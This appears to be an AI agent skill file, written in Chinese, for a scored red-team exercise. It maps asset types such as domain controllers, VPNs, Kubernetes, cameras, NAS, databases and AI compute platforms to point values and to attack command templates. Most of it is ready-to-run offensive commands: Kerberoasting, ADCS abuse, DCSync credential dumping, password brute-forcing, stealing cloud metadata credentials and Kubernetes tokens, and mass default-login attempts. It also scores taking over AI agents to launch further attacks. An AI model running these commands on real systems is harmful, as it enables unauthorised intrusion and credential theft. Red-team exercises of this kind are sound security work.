---
name: specialist-paths
description: 专项打击路径树：域/身份、边界设备、云与 K8s、IoT/OT、文件与备份、AI/算力、中间件与数据库的识别指纹、入口、命令模板与对应得分点
whenToUse: 拿到一类资产（域控、VPN、K8s、摄像头、NAS、算力平台等）不知道从哪下手时
role: exploit
enabled: true
---

# 专项打击路径树

按资产类型查路径：**识别指纹 → 入口点 → 命令模板 → 对应得分点 code**（code 见 `score-coverage`）。
命令里的方括号都是占位符，按现场替换。

## 一、域 / 身份 / 集权（`central-system`）

```text
指纹：445/389/88/5985 开放；LDAP 匿名可查；netbios 名与域同名
入口：域内已控主机 → 凭据收集 → 域管票据 / ADCS / 委派
```

```bash
# 1) 域信息与用户枚举
nxc smb [DC_IP] -u [USER] -p '[PASS]' --users --groups
enum4linux-ng -A [DC_IP]

# 2) 无凭据先看匿名/来宾
nxc smb [DC_IP] -u '' -p '' --shares
nxc ldap [DC_IP] -u '' -p '' --query "(objectClass=user)" "sAMAccountName"

# 3) Kerberoast / AS-REP（拿到哈希后离线破解）
impacket-GetUserSPNs [DOMAIN]/[USER]:'[PASS]' -dc-ip [DC_IP] -request -outputfile runs/kerberoast.txt
impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -dc-ip [DC_IP] -format hashcat -outputfile runs/asrep.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 4) ADCS 提权路径（证书模板配置错误）
certipy find -u [USER]@[DOMAIN] -p '[PASS]' -dc-ip [DC_IP] -vulnerable
certipy req -u [USER]@[DOMAIN] -p '[PASS]' -ca [CA_NAME] -template [TEMPLATE] -upn administrator@[DOMAIN]

# 5) 拿到域管后取凭证（DCSync）
impacket-secretsdump [DOMAIN]/[DOMAIN_ADMIN]:'[PASS]'@[DC_IP] -just-dc-ntlm
```

```text
堡垒机 / SSO / IAM / 零信任控制台：先找后台入口（管理端口、登录页），
弱口令或已知 Nday 进后台 → 后台里的"受管资产清单"直接是内网测绘结果。
对应得分点：central-system（管理员 500 / 普通 50），托管终端另按 terminal-access 计。
```

## 二、边界设备（`netdev` / `netdev-implant` / `boundary-*`）

```text
指纹：VPN 门户、防火墙管理页、网闸/光闸管理端、摆渡机管理口
入口：管理面板弱口令、已知 CVE、配置备份文件导出
```

```bash
# 指纹与版本
nmap -sV -p 443,8443,10443,8080,22,23 [BOUNDARY_IP]
whatweb -a 3 https://[BOUNDARY_IP]

# 管理面弱口令（并发压低，设备容易锁）
hydra -l admin -P /usr/share/wordlists/passwords-top500.txt https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -t 4 -f -o runs/hydra-[BOUNDARY_IP].txt

# 拿到权限后的三件事：导出配置、看路由表、看在线用户（都是 G7 要的证据）
# 导出配置备份 → 里面常含其他设备口令与内网网段
```

> 重定向 / 业务劫持（+200）、设备上植入远控并后续攻击（1000）——两种加成单独记一条命中。边界突破按"同一类边界整个单位只算一次"记，证据留隔离设备控制截图 + 能访问内网的截图。

## 三、云 / K8s（`cloud-platform`）

```text
指纹：云管平台登录页；kubelet 10250；API Server 6443/8080；etcd 2379；Dashboard 8001
入口：泄露的 ak/sk、云元数据（SSRF）、容器内网段直连、配置错误的 etcd
```

```bash
# 云元数据（从 SSRF / 已控主机里取临时凭据）
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]

# K8s 未授权面
curl -sk https://[API_IP]:6443/version
curl -sk https://[KUBELET_IP]:10250/pods
curl -s  http://[ETCD_IP]:2379/v2/keys/?recursive=true
kubectl --server https://[API_IP]:6443 --insecure-skip-tls-verify get nodes

# 进了 Pod 之后：看可用凭据与挂载
env | grep -iE 'kube|token|aws|ak|sk'
find / -name '*.kubeconfig' 2>/dev/null; cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

> 通过 ak/sk 批量控制默认只算被控节点分（10 分/台）；要算管理员分需给出新增节点/改权限的证明。节点数 < 100 的按普通 Web 应用口径给分。

## 四、IoT / OT（`iot-platform` / `iot-corenet` / `iiot`）

```text
指纹：摄像头 Web 页、NVR、打印机 9100/631、wifi 路由管理页、工业组态/SCADA 页面
入口：默认口令、未授权接口、固件里的硬编码凭据
```

```bash
# 摄像头/路由器批量默认口令（先小批量验证再铺开）
nxc http [CIDR] -u admin -p 'admin' --continue-on-success

# 摄像头 RTSP 未授权
ffprobe -v error -rtsp_transport tcp rtsp://[IOT_IP]:554/Streaming/Channels/101

# 打印机 9100 直接把文本打出来（证明控制力）
printf 'PWNED by redteam\n' | nc [PRINTER_IP] 9100

# 固件里的硬编码凭据
binwalk -Me firmware.bin; grep -rInE '(password|passwd|admin|token)' _firmware.bin.extracted | head -40
```

```text
单台设备按 G4 计分（打印机/wifi 5 分；摄像头/大屏 10 分）；
经物联网端点打进核心网并控制重要系统的，单独 +5000（iot-corenet）。
```

## 五、文件 / 备份 / 数据库

```text
指纹：FTP 21、SMB 445、NFS 2049、对象存储（S3/OSS/MinIO）、NAS 管理页、备份系统端口
入口：匿名访问、空口令、共享目录可写、备份产物可下载
```

```bash
# 匿名与空口令
nxc ftp [FTP_IP] -u anonymous -p ''
nxc smb [NAS_IP] -u '' -p '' --shares
smbclient -N -L //[NAS_IP]/
showmount -e [NFS_IP]

# 对象存储桶清单
aws --endpoint-url http://[MINIO_IP]:9000 s3 ls --no-sign-request
curl -s "http://[OSS_IP]/?list-type=2&max-keys=50"

# 数据库（先看未授权，再谈弱口令）
redis-cli -h [REDIS_IP] -p 6379 info; redis-cli -h [REDIS_IP] keys '*'
mongosh "mongodb://[MONGO_IP]:27017" --eval "db.adminCommand({listDatabases:1})"
mysql -h [MYSQL_IP] -u root -p'[PASS]' -e 'select user,host from mysql.user;'
nxc mssql [MSSQL_IP] -u sa -p '[PASS]' -q "select @@version"
curl -s "http://[ES_IP]:9200/_cat/indices?v"; curl -s "http://[ES_IP]:9200/_search?size=1"
```

> 文件存储按 `file-storage`（管理员 50 / 普通 10）；数据库按 `db-credential`（含未授权 10）。数据量另行记（G2），如"备份包 4.2GB，含客户表 132 万条"。

## 六、AI / 算力（`model-*` / `computepower-*` / `ai-agent`）

```text
指纹：模型推理服务（vLLM/Ollama/Triton 端口）、算力管理平台、训练平台、向量库、Agent 编排台
入口：未授权推理接口、平台默认口令、工作流里的凭据、可写知识库
```

```bash
# 未授权推理与模型信息
curl -s http://[MODEL_IP]:11434/api/tags
curl -s -X POST http://[MODEL_IP]:8000/v1/chat/completions \
  -H 'Content-Type: application/json' -d '{"model":"[MODEL]","messages":[{"role":"user","content":"ping"}]}'

# 算力平台 / 训练平台管理面
curl -s http://[PLATFORM_IP]/api/v1/users -H 'Authorization: Bearer [TOKEN]'
# 管理面里能看到节点池、算力卡数量（对应 computepower-cards：10 分/卡）
```

> 算力管理平台 / 训练数据与知识库系统按 `model-compute`（500）；模型相关数据系统按 `model-data`（500）；算力基础设施管理员按 `computepower-admin`，算力卡按 `computepower-cards`（10 分/卡）；控制了 agent 工具并能操作它发起攻击的按 `ai-agent`（100–500 按深度研判）。

## 七、中间件与框架（归到对应的 Web/服务器条目）

| 目标 | 快速验证 | 记分条目 |
| --- | --- | --- |
| Spring Actuator | `curl http://[TGT]/actuator/env`、`/actuator/heapdump` | `server-host` / `web-app` |
| Nacos | `curl http://[TGT]:8848/nacos/v1/auth/users?pageNo=1&pageSize=9` | `web-app` / `unauthorized` |
| Shiro | rememberMe Cookie + 密钥爆破（ysoserial 链） | `server-host` |
| Weblogic | `curl http://[TGT]:7001/console/login/LoginForm.jsp`；T3 探测 | `server-host` |
| Tomcat | `/manager/html` 弱口令 + war 部署 | `server-host` / `web-app` |
| Fastjson / Jackson | 请求体里塞 `{"@type":...}` / 反序列化点 | `server-host` |
| Redis / Docker API | `redis-cli info`、`curl http://[TGT]:2375/version` | `db-credential` / `server-host` |

```bash
# Nday 优先走现成的：先查知识库 + 本机模板，命中就别手搓
# redteam_poc_search(component="[COMPONENT]", cve="[CVE]")
nuclei -u http://[TGT] -t http/cves/[YEAR]/[CVE].yaml -stats
```

## 八、路径选择顺序（同一条资产上）

```text
① 未授权 / 空口令（最快、噪声最低）      ② 已知 Nday（先查知识库与本机模板）
③ 凭据复用（已有口令先在别的资产上试）    ④ 弱口令爆破（并发压低，注意锁号）
⑤ 逻辑漏洞 / 越权 / 上传注入（需业务理解）  ⑥ 后渗透（提权、横向、隧道）后再回到 ①
```

每走一步都 `redteam_chain_add`（`stage_code` 填 recon/internet/boundary/internal/target，
`tool` 写完整命令、`result` 写回显摘要），出货后 `redteam_score_hit` 记分，
新学到的通用手法 `redteam_poc_add` 回填知识库。
